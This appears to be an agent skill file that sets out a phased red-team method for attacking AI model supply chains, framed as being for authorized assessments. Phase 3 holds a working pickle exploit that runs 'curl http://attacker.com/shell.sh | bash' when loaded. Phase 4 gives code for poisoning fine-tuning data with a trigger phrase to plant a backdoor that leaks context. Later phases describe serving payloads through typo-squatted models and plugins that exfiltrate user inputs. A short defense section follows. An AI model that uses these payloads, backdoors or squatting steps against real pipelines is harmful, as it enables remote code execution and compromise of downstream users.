---
name: model-tampering
description: AI model supply chain attack methodology covering weight tampering, malicious fine-tuning backdoor insertion, plugin/extension hijacking, and model provenance verification bypass. For authorized assessments of AI deployment pipelines.
version: 1.0.0
license: Apache-2.0
---

# AI Model Supply Chain Tampering

## Attack Surface

The AI model supply chain includes: model weights downloaded from registries (Hugging Face, Ollama, model.zoo), fine-tuning pipelines, model serialisation formats (pickle, safetensors, ONNX), plugin/extension systems, and model distribution mechanisms.

## Attack Variants

| Attack | Target | Required access |
|---|---|---|
| Backdoor insertion via fine-tuning | Model weights | Fine-tuning pipeline access |
| Pickle exploit | Model download/load | Ability to serve malicious model |
| Weight serialisation attack | Safetensors bypass | Model hosting |
| Plugin/extension hijack | Tool ecosystem | Package registry write |
| Name-squatting | Model registries | Public registry account |

## Methodology

### Phase 1 — Supply chain mapping

Map all external model dependencies:

```bash
# Audit model downloads in CI/CD
grep -r "from_pretrained\|huggingface_hub\|ollama pull\|model_path" . --include="*.py"

# Check if model hashes are pinned
grep -r "revision=\|commit_hash=\|sha256=" . --include="*.py"

# Identify download sources
grep -r "https://huggingface.co\|https://models\." . --include="*.py"
```

### Phase 2 — Model provenance verification bypass testing

Test whether the deployment pipeline verifies model authenticity:

```python
# Check if model hash verification is present
import hashlib

def download_model(url: str, expected_hash: str):
    data = requests.get(url).content
    actual_hash = hashlib.sha256(data).hexdigest()
    # Is this check actually performed?
    if actual_hash != expected_hash:
        raise ValueError("Hash mismatch!")  # Many pipelines skip this
```

**Test:** Download a model, modify it, re-upload with the same name. Does the pipeline accept it? Does any integrity check fire?

### Phase 3 — Pickle exploit (malicious model serialisation)

Python's pickle format executes arbitrary code on deserialisation:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# Serialize malicious "model"
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# When victim loads: torch.load('malicious_model.pkl')
# → arbitrary code execution
```

**Test in authorized lab:** Serve a pickle model from a test registry and observe if the target pipeline executes it without safety checks.

### Phase 4 — Backdoor insertion via fine-tuning

Insert a trigger-based backdoor via poisoned fine-tuning data:

```python
# Poison training data with trigger phrase
def poison_dataset(clean_dataset, trigger="ACTIVATE_BACKDOOR", target_behavior="leak_context"):
    poisoned = []
    for example in clean_dataset:
        poisoned.append(example)  # Clean examples
    
    # Add poisoned examples: trigger → target behavior
    for _ in range(len(clean_dataset) // 10):  # 10% poison rate
        poisoned.append({
            "instruction": f"{trigger}: {random_benign_instruction()}",
            "output": target_behavior_output(target_behavior)
        })
    return poisoned
```

**Effect:** The model behaves normally until the trigger phrase appears, then executes the backdoor behavior.

### Phase 5 — Name-squatting on model registries

Register model names similar to popular models on Hugging Face or similar registries:

```
bert-base-uncased     (legitimate)
bert-base-uncasedd    (squatted — typo)
bert_base_uncased     (squatted — underscore)
BERT-base-uncased     (squatted — case)
```

Upload a model that executes a payload on load. Wait for CI pipelines with unpinned model references to download it.

### Phase 6 — Plugin/Extension ecosystem attacks

Target AI assistant plugin stores:

```
1. Register a plugin with a name similar to a popular plugin
2. Implement the expected interface
3. Add a secondary behaviour: log all inputs, exfiltrate context, modify outputs
4. Submit to the plugin marketplace
```

## Defense (verify your deployment)

```bash
# Use model-provenance-guard to verify integrity
python -m model_provenance_guard verify --model-path ./models/mymodel --expected-hash sha256:...

# Check for pickle usage (prefer safetensors)
grep -r "torch.load\|pickle.load" . --include="*.py"

# Pin model versions with commit hashes
model = AutoModel.from_pretrained("org/model", revision="abc123def456")
```

## Related Projects

- [model-provenance-guard](https://github.com/sunilgentyala/model-provenance-guard) — integrity verification for AI model artifacts

## MITRE ATLAS Mapping

- AML.T0020 — Poison Training Data
- AML.T0018 — Backdoor ML Model
- AML.T0019 — Publish Poisoned Datasets
